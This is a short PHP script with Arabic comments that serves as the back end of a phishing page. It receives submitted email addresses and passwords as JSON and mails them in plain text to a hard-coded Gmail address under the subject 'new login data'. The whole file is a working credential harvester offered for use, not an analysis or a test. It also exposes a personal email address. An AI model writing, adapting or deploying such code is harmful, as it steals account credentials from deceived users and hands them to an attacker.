<?php
// قراءة بيانات JSON المرسلة
$data = json_decode(file_get_contents("php://input"), true);

if ($data) {
    // الحصول على البريد الإلكتروني وكلمة المرور
    $email = $data['email'];
    $password = $data['password'];

    // إعداد تفاصيل البريد
    $to = "frym5018@gmail.com";
    $subject = "بيانات تسجيل الدخول الجديدة";
    $message = "البريد الإلكتروني: $email\nكلمة المرور: $password";
    $headers = "From: no-reply@yourdomain.com";

    // إرسال البريد
    if (mail($to, $subject, $message, $headers)) {
        echo "تم إرسال البريد بنجاح.";
    } else {
        echo "فشل في إرسال البريد.";
    }
} else {
    echo "لم يتم استلام بيانات صحيحة.";
}
?>
